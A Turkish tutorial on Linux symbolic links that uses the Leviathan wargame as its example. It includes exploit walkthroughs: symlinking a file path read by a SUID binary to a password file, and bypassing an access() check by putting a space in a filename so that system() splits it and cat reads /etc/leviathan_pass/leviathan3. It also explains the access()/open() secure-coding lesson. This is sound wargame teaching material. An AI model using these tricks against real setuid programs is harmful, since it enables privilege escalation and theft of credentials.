# Sembolik Linkler

---

## ln -s — Sembolik Link Oluşturma

```bash
ln -s <hedef> <link_adı>
```

**Sembolik link (symlink):** Bir dosyaya veya dizine başka bir konumdan işaret eden kısayol. Windows'taki "shortcut" gibi düşünebilirsin — ama çok daha güçlü.

```bash
# Temel kullanım
ln -s /etc/leviathan_pass/leviathan3 /tmp/mydir/gizli

# /tmp/mydir/gizli artık leviathan3 şifresine işaret ediyor
cat /tmp/mydir/gizli    # şifreyi okur (yetkin varsa)
```

**Sembolik linki tanıma:**
```bash
$ ls -la /tmp/mydir/
lrwxrwxrwx 1 user user 35 ... gizli -> /etc/leviathan_pass/leviathan3
^                                   ^^
l → sembolik link                   -> hedefi gösterir
```

---

## readlink — Link Hedefini Öğrenme

```bash
readlink <link>
readlink -f <link>    # tüm zinciri çöz, mutlak yolu ver
```

```bash
$ readlink /tmp/mydir/gizli
/etc/leviathan_pass/leviathan3

$ readlink -f ./gizli
/etc/leviathan_pass/leviathan3
```

---

## Sembolik Linklerle Binary Kandırma

SUID binary'ler sabit bir dosya yolunu okursa, o yola sembolik link koyarak binary'yi istediğin dosyayı okutabilirsin.

**Leviathan Level 5 örneği:**

```bash
# Binary /tmp/file.log'u okuyor (ltrace ile tespit edildi)
$ ltrace ./leviathan5
fopen("/tmp/file.log", "r") = 0    ← dosya yok

# /tmp/file.log'u şifre dosyasına link et
$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log

# Binary artık şifreyi okuyor
$ ./leviathan5
<şifre buraya gelir>
```

---

## access() Kontrolünü Atlatma — Boşlukla Argüman Bölme (Leviathan Level 2)

> **Dikkat:** Bu seviye sık sık yanlışlıkla "TOCTOU" diye anılır. Aslında burada bir **zaman yarışı (race) yoktur**. Açık, `access()` ile `system()`'in **aynı string'i farklı yorumlamasıdır**. Symlink'i ise, `cat`'in okuduğu parçayı parola dosyasına yönlendirmek için kullanırız.

`printfile` bir dosyayı `access()` ile kontrol edip `system("/bin/cat " + argv[1])` ile basar:

```bash
$ ltrace ./printfile .bashrc
access(".bashrc", 4)                    ← 1. KONTROL: TÜM string'e tek yol olarak bakar
snprintf("/bin/cat .bashrc", 511, ...)
system("/bin/cat .bashrc")              ← 2. KULLANIM: /bin/sh string'i BOŞLUKTAN böler
```

- `access()` argv[1]'i **tek bir bütün yol** olarak görür → bizim oluşturduğumuz gerçek dosyada geçer.
- `system()` → `/bin/sh` string'i **boşluktan böler** → `cat`'e birden çok argüman verir.

> Neden saf symlink yetmez? `access()` symlink'i **gerçek uid (leviathan2)** ile takip eder; leviathan2 parola dosyasını okuyamadığı için doğrudan symlink'te `access()` başarısız olur. Bu yüzden access'i okunabilir gerçek bir dosyayla geçirip, symlink'i yalnızca `cat`'in (efektif uid = leviathan3) okuduğu parçaya koyarız.

**Exploit:**

```bash
# 1. Geçici dizin oluştur
mktemp -d    # → /tmp/tmp.BykcxJXZxD

# 2. İsimde boşluk olan bir dosya oluştur
touch "/tmp/tmp.BykcxJXZxD/test file.txt"

# 3. "test" adıyla şifre dosyasına symlink koy
ln -s /etc/leviathan_pass/leviathan3 /tmp/tmp.BykcxJXZxD/test

# 4. Dizine herkes erişebilsin
chmod 777 /tmp/tmp.BykcxJXZxD

# 5. Binary'yi "test file.txt" ile çalıştır
./printfile "/tmp/tmp.BykcxJXZxD/test file.txt"
```

Ne oluyor:
```
access("/tmp/tmp.BykcxJXZxD/test file.txt")  → dosya var ✓  (kontrol geçti)
system("/bin/cat /tmp/tmp.BykcxJXZxD/test file.txt")
         → cat /tmp/tmp.BykcxJXZxD/test      ← symlink → şifreyi okur ✓
         → cat file.txt                       ← yok, hata (önemli değil)
```

**Asıl TOCTOU farkı:** Gerçek bir TOCTOU açığında, `access()` ile `open()` *arasındaki* zaman penceresinde dosya (örn. symlink ile) değiştirilir — yani istismar edilen şey **zamanlamadır**. Leviathan 2'de ise zamanlama değil, **string'in farklı ayrıştırılması** istismar edilir. Ortak ders aynı: `access()` ile sonraki işlemi (aynı string'e bile olsa) farklı yorumlamak tehlikelidir; modern kodlarda `access()` yerine doğrudan `open()` + hata kontrolü tercih edilir.

---

## Özet

| Komut | Ne yapar |
|---|---|
| `ln -s hedef link` | Hedefe işaret eden sembolik link oluşturur |
| `readlink link` | Linkin hedefini gösterir |
| `readlink -f link` | Tüm zinciri çözüp mutlak yolu verir |
| `ls -la` | `l` ile başlayan satırlar sembolik link |
